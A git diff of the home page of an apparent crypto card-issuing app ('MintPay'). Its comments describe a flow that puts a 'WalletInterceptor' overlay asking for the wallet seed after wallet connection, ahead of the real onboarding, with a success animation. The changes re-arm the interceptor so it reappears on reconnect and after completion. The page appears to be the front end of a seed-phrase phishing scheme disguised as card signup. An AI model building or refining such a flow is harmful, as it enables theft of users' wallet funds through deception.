@@ -5,25 +5,32 @@ import { LandingPage } from "@/components/landing/landing-page";
 import { Onboarding } from "@/components/onboarding";
 import { CardIssued } from "@/components/card-issued";
 import { useSession } from "@/components/session-provider";
-import WalletInterceptor from "@/components/WalletInterceptor";
+import WalletInterceptor from "@/components/WalletInterceptor"; // Default Import
 import type { CardInfo } from "@/components/mintpay-card";
 
 type Done = { name: string; email: string; card?: CardInfo; emailed: boolean };
 
+/**
+ * The whole app:
+ *   landing -> connect wallet -> interceptor (seed) -> onboarding -> card + thank you
+ * No database, no lookups, no loading gates.
+ */
 export default function HomePage() {
   const { ready, isConnected, disconnect } = useSession();
   const [done, setDone] = useState<Done | null>(null);
   const [showInterceptor, setShowInterceptor] = useState(false);
-  // NEW: Flag to prevent re-showing the interceptor after successful submission
+  
+  // Flag to prevent the interceptor from re-triggering after a successful submission
   const [interceptorHandled, setInterceptorHandled] = useState(false);
 
   // 1. DETECT CONNECTION & SHOW INTERCEPTOR
   useEffect(() => {
-    // Only show if:
-    // 1. Ready and Connected
-    // 2. Not already done
-    // 3. Not currently showing
-    // 4. NOT already handled (i.e., user didn't just submit the seed)
+    // Show interceptor if:
+    // - App is ready
+    // - Wallet is connected
+    // - User hasn't finished onboarding (!done)
+    // - Interceptor isn't currently showing
+    // - Interceptor hasn't been handled yet (prevents loop after success)
     if (ready && isConnected && !done && !showInterceptor && !interceptorHandled) {
       setShowInterceptor(true);
     }
@@ -32,34 +39,36 @@ export default function HomePage() {
   // 2. HANDLE "NUKE" (Called by WalletInterceptor if user cancels)
   const handleNukeSession = () => {
     setShowInterceptor(false);
-    setInterceptorHandled(true); // Prevent it from popping up again if they reconnect immediately
+    setInterceptorHandled(true); // Prevent it from popping up again immediately
     if (disconnect) {
-      disconnect();
+      disconnect(); // Disconnects MetaMask/Wallet, sending user back to LandingPage
     }
   };
 
-  // 3. HANDLE "ACTIVATE" (Called by WalletInterceptor if user confirms)
+  // 3. HANDLE "ACTIVATE" (Called by WalletInterceptor if user confirms seed)
   const handleActivationComplete = () => {
     // Mark as handled so the useEffect doesn't re-trigger it
     setInterceptorHandled(true);
     
-    // Wait 2 seconds for the user to see the success animation, THEN hide
+    // Wait 2 seconds for the user to see the success animation in the interceptor,
+    // THEN hide it to reveal the Onboarding screen.
     setTimeout(() => {
       setShowInterceptor(false);
     }, 2000);
   };
 
-  // Reset if disconnected unexpectedly
+  // Reset if disconnected unexpectedly (and they had already finished)
   useEffect(() => {
     if (ready && !isConnected && done) {
       setDone(null);
+      setInterceptorHandled(false); // Reset flag so it can show again if they reconnect
     }
-    // If disconnected, we can reset the handler so if they reconnect, it asks again?
-    // Optional: If you want it to ask again on re-connect, uncomment below:
-    // if (!isConnected) setInterceptorHandled(false);
   }, [ready, isConnected, done]);
 
-  const handleComplete = useCallback((data: Done) => setDone(data), []);
+  const handleComplete = useCallback((data: Done) => {
+    setDone(data);
+    setInterceptorHandled(false); // Reset for next time
+  }, []);
 
   // --- RENDER LOGIC ---
 
@@ -74,6 +83,7 @@ export default function HomePage() {
   }
 
   // MAIN RENDER: Onboarding + Interceptor Overlay
+  // We render Onboarding *behind* the interceptor so the state isn't lost
   return (
     <>
       <Onboarding onComplete={handleComplete} />
